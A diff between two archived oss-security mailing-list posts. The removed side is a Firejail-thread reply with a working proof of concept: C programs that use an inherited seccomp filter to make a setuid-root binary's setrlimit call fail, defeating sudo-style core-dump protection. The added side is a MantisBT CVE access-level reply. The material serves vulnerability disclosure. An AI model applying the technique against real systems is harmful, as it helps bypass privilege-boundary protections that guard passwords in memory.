@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3473" "Sunday" "8" "January" "2017" "12:51:58" "+0100" "Martin Carpenter" "mcarpenter@free.fr" "<1483876318.5179.50.camel@juliet.mcarpenter.org>" "118" "Re: [oss-security] Re: Firejail local root exploit" "^Date:" nil nil "1" "2017010811:51:58" "[oss-security] Re: Firejail local root exploit" (number mark "        mcarpenter@f Jan  8  118/3473  " thread-indent "\"Re: [oss-security] Re: Firejail local root exploit\"\n") "<1483795275.8979.125.camel@juliet.mcarpenter.org>" ("<730e35dc08384f6f9bef4e403802a871@imshyb02.MITRE.ORG>" "<f47526d9-157e-1600-8f64-d737db07753c@web.de>" "<1483795275.8979.125.camel@juliet.mcarpenter.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["945" "Thursday" "25" "June" "2015" "07:09:35" "+0000" "Damien Regad" "dregad@mantisbt.org" "<loom.20150625T090750-338@post.gmane.org>" "33" "[oss-security] Re: CVE Request: Information disclosure in MantisBT" nil nil nil "6" "2015062507:09:35" "[oss-security] Re: CVE Request: Information disclosure in MantisBT" (number mark "U       dregad@manti Jun 25   33/945   " thread-indent "\"[oss-security] Re: CVE Request: Information disclosure in MantisBT\"\n") "<20150625024518.E36E5ABC026@smtpvmsrv1.mitre.org>" ("<mmfd21$39r$1@ger.gmane.org>" "<20150625024518.E36E5ABC026@smtpvmsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11922 invoked by uid 550); 8 Jan 2017 13:33:59 -0000
+Received: (qmail 26484 invoked by uid 550); 25 Jun 2015 07:10:13 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,138 +11,53 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 5842 invoked from network); 8 Jan 2017 11:52:11 -0000
-Message-ID: <1483876318.5179.50.camel@juliet.mcarpenter.org>
-In-Reply-To: <1483795275.8979.125.camel@juliet.mcarpenter.org>
-References: <730e35dc08384f6f9bef4e403802a871@imshyb02.MITRE.ORG>
-	<f47526d9-157e-1600-8f64-d737db07753c@web.de>
-	<1483795275.8979.125.camel@juliet.mcarpenter.org>
-X-Mailer: Evolution 3.10.4-0ubuntu2
-Mime-Version: 1.0
-X-sfr-mailing: LEGIT
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-Date: Sun, 08 Jan 2017 12:51:58 +0100
-From: Martin Carpenter <mcarpenter@free.fr>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Re: Firejail local root exploit
+Received: (qmail 26464 invoked from network); 25 Jun 2015 07:10:13 -0000
+X-Injected-Via-Gmane: http://gmane.org/
 To: oss-security@lists.openwall.com
+From: Damien Regad <dregad@mantisbt.org>
+Date: Thu, 25 Jun 2015 07:09:35 +0000 (UTC)
+Message-ID: <loom.20150625T090750-338@post.gmane.org>
+References: <mmfd21$39r$1@ger.gmane.org> <20150625024518.E36E5ABC026@smtpvmsrv1.mitre.org>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-Complaints-To: usenet@ger.gmane.org
+X-Gmane-NNTP-Posting-Host: sea.gmane.org
+User-Agent: Loom/3.14 (http://gmane.org/)
+X-Loom-IP: 193.134.187.35 (Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0)
+Subject: [oss-security] Re: CVE Request: Information disclosure in MantisBT
 
-On Sat, 2017-01-07 at 14:21 +0100, Martin Carpenter wrote:
-> prctl(PR_CAPBSET_DROP, ...) (see caps.c) requires CAP_SETPCAP. 
+ <cve-assign@...> writes:
 
-Oops, I was looking at the wrong flag: PR_SECCOMP_SET doesn't require
-capabilities. Thanks sivmu.
+> Use CVE-2015-5059 for the issue in which $g_view_proj_doc_threshold
+> had been ANYBODY but is supposed to be VIEWER.
 
-So that... doesn't improve things, quite the opposite. Here's
-disable_coredumps() from sudo 1.8.9p5 (as shipped with Ubuntu 14.04,
-which does not disable suid coredumps on desktop by default):
+Thanks for the CVE. 
 
- 784 /*
- 785  * Disable core dumps to avoid dropping a core with user password
-in it.
- 786  * We will reset this limit before executing the command.
- 787  * Not all operating systems disable core dumps for setuid
-processes.
- 788  */
- 789 static void
- 790 disable_coredumps(void)
- 791 {
- 792 #if defined(RLIMIT_CORE)
- 793     struct rlimit rl;
- 794     debug_decl(disable_coredumps, SUDO_DEBUG_UTIL)
- 795 
- 796     /*
- 797      * Turn off core dumps?
- 798      */
- 799     if (sudo_conf_disable_coredump()) {
- 800     (void) getrlimit(RLIMIT_CORE, &corelimit);
- 801     memcpy(&rl, &corelimit, sizeof(struct rlimit));
- 802     rl.rlim_cur = 0;
- 803     (void) setrlimit(RLIMIT_CORE, &rl);
- 804     }
- 805     debug_return;
- 806 #endif /* RLIMIT_CORE */
- 807 }
+> Is there any related security problem caused by this possible
+> inconsistency in the code:
+> 
+>   define( 'ANYBODY', 0 );
+> 
+>   function access_get_global_level
+> 
+>           if( empty( $p_user_id ) && !auth_is_user_authenticated() ) {
+>                   return false;
+> 
+>   function access_get_project_level
+> 
+>           if( empty( $p_user_id ) && !auth_is_user_authenticated() ) {
+>                   return ANYBODY;
+> 
+> ? In other words, is an unauthenticated client sometimes, but not always,
+> considered to have the ANYBODY access level?
 
-The return value from setrlimit() at line 803 is not checked.
+Thanks for bringing this to my attention. At first glance it certainly looks
+like an inconsistency; I will review the code in detail to determine whether
+this is intentional or not, and will let you know.
 
-PoC: two programs (below): foo, to set up a seccomp filter (using
-libseccomp) to fail calls to setrlimit() and then fork/exec bar, which
-duplicates disable_coredumps() above, setuid-root, 4755. All works as
-expected: a non-privileged user can prevent the call to setrlimit() in
-privileged bar and execution continues. (The filter is inherited since
-calls to fork, exec are not blocked).
-
-Again we can probably push root cause off to sudo's failure to check the
-setrlimit() return value (or Ubuntu's defaults...) but pragmatically
-there just has to be more stuff out there like this. sudo was literally
-the first thing I looked at... Disabling filter inheritance across the
-privilege boundary doesn't seem like an obviously good solution(?).
-
-OpenBSD's pledge(2), by contrast, only sends uncatchable-SIGABRT and
-pledges are not inherited by subprocesses, privileged or not.
-
-
-$ cat foo.c
-
-#include <linux/seccomp.h>
-#include <seccomp.h>
-#include <stdio.h>
-#include <sys/prctl.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
-
-int main(int argc, const char *argv[])
-{
-  int status;
-  char *args[] = { "./bar", NULL };
-  scmp_filter_ctx ctx;
-  switch(fork()) {
-      case -1: /* error */
-          perror("fork");
-          return 1;
-          break;
-      case 0: /* child */
-          ctx = seccomp_init(SCMP_ACT_ALLOW); // permit all
-          seccomp_rule_add(ctx, SCMP_ACT_ERRNO(1), SCMP_SYS(setrlimit),
-0); // blacklist setrlimit
-          seccomp_load(ctx);
-          execv(args[0], args);
-          perror("execv");
-          _exit(1);
-          break;
-      default:
-          if(-1 == wait(&status)) {
-              perror("wait");
-              return 1;
-          }
-          printf("exit code %d\n", WEXITSTATUS(status));
-  }
-  return 0; 
-}
-$ cat bar.c
-
-#include <sys/time.h>
-#include <sys/resource.h>
-#include <string.h>
-
-int main(int argc, const char *argv[])
-{
-    struct rlimit rl;
-    struct rlimit corelimit;
-    (void) getrlimit(RLIMIT_CORE, &corelimit);
-    memcpy(&rl, &corelimit, sizeof(struct rlimit));
-    rl.rlim_cur = 0;
-    return setrlimit(RLIMIT_CORE, &rl) ? 2 : 0;
-}
-$ gcc -o foo foo.c -lseccomp
-$ gcc -o bar bar.c
-$ sudo chown root bar
-$ sudo chmod 4755 bar
-$ ./foo 
-exit code 2
-$
+Cheers
+Damien
 
 
